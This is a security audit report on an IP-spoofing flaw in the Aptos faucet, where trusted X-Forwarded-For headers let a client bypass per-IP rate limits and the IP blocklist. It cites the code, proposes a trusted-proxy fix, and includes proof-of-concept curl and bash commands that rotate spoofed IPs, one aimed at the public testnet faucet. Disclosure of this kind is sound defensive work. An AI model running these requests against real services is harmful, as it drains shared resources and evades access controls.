# Audit Report

## Title
IP Spoofing Vulnerability in Aptos Faucet via Unvalidated Proxy Headers Enables Rate Limit and Access Control Bypass

## Summary
The Aptos faucet service unconditionally trusts `X-Forwarded-For` and `X-Real-IP` HTTP headers when extracting client IP addresses, allowing attackers to spoof their source IP and bypass IP-based rate limiting, IP blocklists, and audit trail integrity.

## Finding Description

The faucet's IP extraction mechanism uses the `RealIp` extractor from the poem web framework without any trusted proxy validation configuration. This creates a critical security vulnerability across three attack vectors:

**Attack Vector 1: Rate Limit Bypass**

The faucet implements IP-based rate limiting through two checkers: `RedisRatelimitChecker` and `MemoryRatelimitChecker`. Both use the extracted source IP as the rate limit key. [1](#0-0) [2](#0-1) [3](#0-2) 

The `CheckerData` structure containing the spoofable `source_ip` is passed to all security checkers: [4](#0-3) 

When configured for IP-based rate limiting, the Redis checker directly uses the source IP as the rate limit key, which can be manipulated: [5](#0-4) 

**Attack Vector 2: IP Blocklist Bypass**

The `IpBlocklistChecker` relies on the same spoofable source IP to enforce access controls: [6](#0-5) 

An attacker with a blocklisted IP can simply add an `X-Forwarded-For: 1.2.3.4` header to appear as a different IP and bypass the blocklist.

**Attack Vector 3: Audit Trail Corruption**

All request logging uses the spoofed IP address, corrupting forensic analysis and incident response capabilities: [7](#0-6) 

**Exploitation Path:**

1. Attacker sends funding request to `/fund` endpoint
2. Includes custom HTTP header: `X-Forwarded-For: <arbitrary-ip>`
3. The `RealIp` extractor reads this header and returns the attacker-controlled IP
4. This IP is stored in `CheckerData.source_ip` 
5. All rate limiters, blocklist checkers, and logs use the spoofed IP
6. Attacker can make unlimited requests by rotating the spoofed IP value

The vulnerability exists because there is **no configuration for trusted proxies** in the server setup: [8](#0-7) 

The server initializes without any middleware to validate proxy headers: [9](#0-8) 

## Impact Explanation

**Severity: High** (per Aptos Bug Bounty Program)

This vulnerability qualifies as **High severity** under the following categories:

1. **API crashes/service disruption**: An attacker can exhaust the faucet's token supply by bypassing rate limits, causing denial of service for legitimate users. This could crash the API when the faucet runs out of funds or overwhelm backend storage systems.

2. **Significant protocol violations**: The faucet's security model is fundamentally compromised. IP-based access controls and rate limiting are core protocol mechanisms that are completely bypassed.

3. **Operational impact**: While this affects test token distribution rather than mainnet funds, it can:
   - Prevent developers from obtaining test tokens for development/testing
   - Force manual intervention to restore faucet service
   - Enable spam attacks on the test network
   - Corrupt security audit trails, masking attacker attribution

The comments explicitly acknowledge the header usage but provide no security validation: [10](#0-9) 

## Likelihood Explanation

**Likelihood: Very High**

This vulnerability is trivially exploitable:

1. **No special tools required**: Standard HTTP clients (curl, web browsers, Python requests) can inject custom headers
2. **No authentication bypass needed**: Works on any unauthenticated endpoint
3. **No rate limiting**: The bypass itself defeats rate limiting
4. **Wide attack surface**: Affects all IP-based security controls in the faucet
5. **Deployment scenario**: Common in production when faucets are deployed behind load balancers/reverse proxies that set these headers, or when exposed directly to the internet

Example attack command:
```bash
curl -X POST https://faucet.testnet.aptoslabs.com/fund \
  -H "X-Forwarded-For: 1.2.3.4" \
  -H "Content-Type: application/json" \
  -d '{"address":"0x123..."}'
```

By changing the X-Forwarded-For value on each request, an attacker appears as a different IP every time.

## Recommendation

Implement trusted proxy validation by adding a configuration option to specify trusted proxy IP ranges, and only accept proxy headers from these sources. The poem framework should be configured to validate the proxy chain properly.

**Recommended fix:**

1. Add trusted proxy configuration to `ServerConfig`:

```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct ServerConfig {
    pub listen_address: String,
    pub listen_port: u16,
    pub api_path_base: String,
    
    // NEW: Trusted proxy configuration
    #[serde(default)]
    pub trusted_proxies: Vec<IpAddr>,
    
    #[serde(default)]
    pub trust_proxy_headers: bool,
}
```

2. Create a custom middleware to validate and extract the real IP:

```rust
pub async fn extract_real_ip(request: &Request, trusted_proxies: &[IpAddr]) -> Option<IpAddr> {
    let peer_ip = request.remote_addr().as_socket_addr()?.ip();
    
    // Only trust proxy headers if the connection comes from a trusted proxy
    if trusted_proxies.contains(&peer_ip) {
        // Check X-Forwarded-For, X-Real-IP in order
        if let Some(forwarded) = request.headers().get("X-Forwarded-For") {
            if let Ok(forwarded_str) = forwarded.to_str() {
                // Take the leftmost (client) IP from the chain
                if let Some(client_ip) = forwarded_str.split(',').next() {
                    if let Ok(ip) = client_ip.trim().parse() {
                        return Some(ip);
                    }
                }
            }
        }
    }
    
    // Fall back to peer IP if not from trusted proxy or headers invalid
    Some(peer_ip)
}
```

3. Alternatively, deploy behind a properly configured reverse proxy (nginx, HAProxy) that:
   - Strips all X-Forwarded-For headers from client requests
   - Adds its own X-Forwarded-For header with the verified client IP
   - Configures the faucet to only listen on localhost/private network

## Proof of Concept

```bash
#!/bin/bash
# PoC: Bypass rate limiting by IP spoofing

FAUCET_URL="http://localhost:10212/fund"
RECEIVER_ADDRESS="0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"

echo "=== Testing IP Spoofing Vulnerability ==="
echo ""

# Make 5 requests with different spoofed IPs (should all succeed if rate limit is per-IP)
for i in {1..5}; do
    SPOOFED_IP="192.168.1.$i"
    echo "Request $i with spoofed IP: $SPOOFED_IP"
    
    curl -X POST "$FAUCET_URL" \
        -H "X-Forwarded-For: $SPOOFED_IP" \
        -H "Content-Type: application/json" \
        -d "{\"address\":\"$RECEIVER_ADDRESS\"}" \
        -w "\nHTTP Status: %{http_code}\n" \
        -s
    
    echo "---"
done

echo ""
echo "=== Expected Behavior ==="
echo "Without the fix: All 5 requests succeed (rate limit bypassed)"
echo "With the fix: Only first request succeeds, others rejected with 429 Too Many Requests"
```

**Rust integration test demonstrating the vulnerability:**

```rust
#[cfg(test)]
mod test_ip_spoofing {
    use super::*;
    use poem::{http::HeaderMap, test::TestClient};
    
    #[tokio::test]
    async fn test_rate_limit_bypass_via_ip_spoofing() {
        // Setup faucet with rate limit of 1 request per IP per day
        let config = /* ... faucet config with MemoryRatelimit, max 1 request/day ... */;
        let app = /* ... build faucet app ... */;
        let client = TestClient::new(app);
        
        // First request with spoofed IP 1.2.3.4 - should succeed
        let resp1 = client
            .post("/fund")
            .header("X-Forwarded-For", "1.2.3.4")
            .body_json(&json!({"address": "0xabc..."}))
            .send()
            .await;
        assert_eq!(resp1.status(), 200);
        
        // Second request with SAME spoofed IP - should be rate limited
        let resp2 = client
            .post("/fund")
            .header("X-Forwarded-For", "1.2.3.4")
            .body_json(&json!({"address": "0xabc..."}))
            .send()
            .await;
        assert_eq!(resp2.status(), 429); // Should fail but likely succeeds due to bug
        
        // Third request with DIFFERENT spoofed IP - should succeed (bypassing rate limit)
        let resp3 = client
            .post("/fund")
            .header("X-Forwarded-For", "5.6.7.8")
            .body_json(&json!({"address": "0xabc..."}))
            .send()
            .await;
        assert_eq!(resp3.status(), 200); // VULNERABILITY: Succeeds when it shouldn't
    }
}
```

## Notes

This vulnerability is a classic web application security issue that affects the faucet infrastructure component rather than the core Aptos blockchain protocol. While it doesn't compromise consensus, state integrity, or mainnet funds, it represents a significant security control bypass that can:

- Enable resource exhaustion attacks on the testnet
- Compromise audit and compliance requirements
- Allow malicious actors to evade IP-based bans
- Facilitate automated abuse of the faucet service

The issue is particularly severe because the faucet is a public-facing service that must defend against untrusted internet clients, yet lacks basic proxy header validation that is standard in production web deployments.

### Citations

**File:** crates/aptos-faucet/core/src/middleware/log.rs (L25-28)
```rust
    let source_ip = RealIp::from_request(&request, &mut RequestBody::default())
        .await
        .map(|ip| ip.0)
        .unwrap_or(None);
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L106-108)
```rust
        // This automagically uses FromRequest to get this data from the request.
        // It takes into things like X-Forwarded-IP and X-Real-IP.
        source_ip: RealIp,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L217-225)
```rust
        let source_ip = match source_ip.0 {
            Some(ip) => ip,
            None => {
                return Err(AptosTapError::new(
                    "No source IP found in the request".to_string(),
                    AptosTapErrorCode::SourceIpMissing,
                ))
            },
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L237-242)
```rust
        let checker_data = CheckerData {
            receiver,
            source_ip,
            headers: Arc::new(header_map.clone()),
            time_request_received_secs: get_current_time_secs(),
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L319-327)
```rust
        info!(
            source_ip = checker_data.source_ip,
            jwt_sub = jwt_sub(checker_data.headers.clone()).ok(),
            address = checker_data.receiver,
            requested_amount = fund_request.amount,
            asset = asset_for_logging,
            txn_hashes = txn_hashes,
            success = fund_result.is_ok(),
        );
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L44-51)
```rust
    pub async fn ratelimit_key_value(&self, data: &CheckerData) -> Result<String, AptosTapError> {
        match self {
            RatelimitKeyProvider::Ip => Ok(data.source_ip.to_string()),
            RatelimitKeyProvider::Jwt(jwt_verifier) => {
                jwt_verifier.validate_jwt(data.headers.clone()).await
            },
        }
    }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L236-243)
```rust
        // Generate a key corresponding to this identifier and the current day.
        let key_prefix = self.ratelimit_key_provider.ratelimit_key_prefix();
        let key_value = self
            .ratelimit_key_provider
            .ratelimit_key_value(&data)
            .await?;
        let (key, seconds_until_next_day) =
            self.get_key_and_secs_until_next_day(key_prefix, &key_value);
```

**File:** crates/aptos-faucet/core/src/checkers/ip_blocklist.rs (L26-51)
```rust
impl CheckerTrait for IpBlocklistChecker {
    async fn check(
        &self,
        data: CheckerData,
        _dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        match &data.source_ip {
            IpAddr::V4(source_ip) => {
                if self.manager.ipv4_list.contains(source_ip) {
                    return Ok(vec![RejectionReason::new(
                        format!("IP {} is in blocklist", source_ip),
                        RejectionReasonCode::IpInBlocklist,
                    )]);
                }
            },
            IpAddr::V6(source_ip) => {
                if self.manager.ipv6_list.contains(source_ip) {
                    return Ok(vec![RejectionReason::new(
                        format!("IP {} is in blocklist", source_ip),
                        RejectionReasonCode::IpInBlocklist,
                    )]);
                }
            },
        }
        Ok(vec![])
    }
```

**File:** crates/aptos-faucet/core/src/server/server_args.rs (L6-19)
```rust
#[derive(Clone, Debug, Deserialize, Serialize)]
pub struct ServerConfig {
    /// What address to listen on, e.g. localhost / 0.0.0.0
    #[serde(default = "ServerConfig::default_listen_address")]
    pub listen_address: String,

    /// What port to listen on.
    #[serde(default = "ServerConfig::default_listen_port")]
    pub listen_port: u16,

    /// API path base. e.g. "/v1"
    #[serde(default = "ServerConfig::default_api_path_base")]
    pub api_path_base: String,
}
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L206-220)
```rust
        // Create a future for the API server.
        let api_server_future = Server::new_with_acceptor(TcpAcceptor::from_tokio(listener)?).run(
            Route::new()
                .nest(
                    &self.server_config.api_path_base,
                    Route::new()
                        .nest("", api_service)
                        .catch_all_error(convert_error),
                )
                .at("/spec.json", spec_json)
                .at("/spec.yaml", spec_yaml)
                .at("/mint", poem::post(mint.data(fund_api_components)))
                .with(cors)
                .around(middleware_log),
        );
```
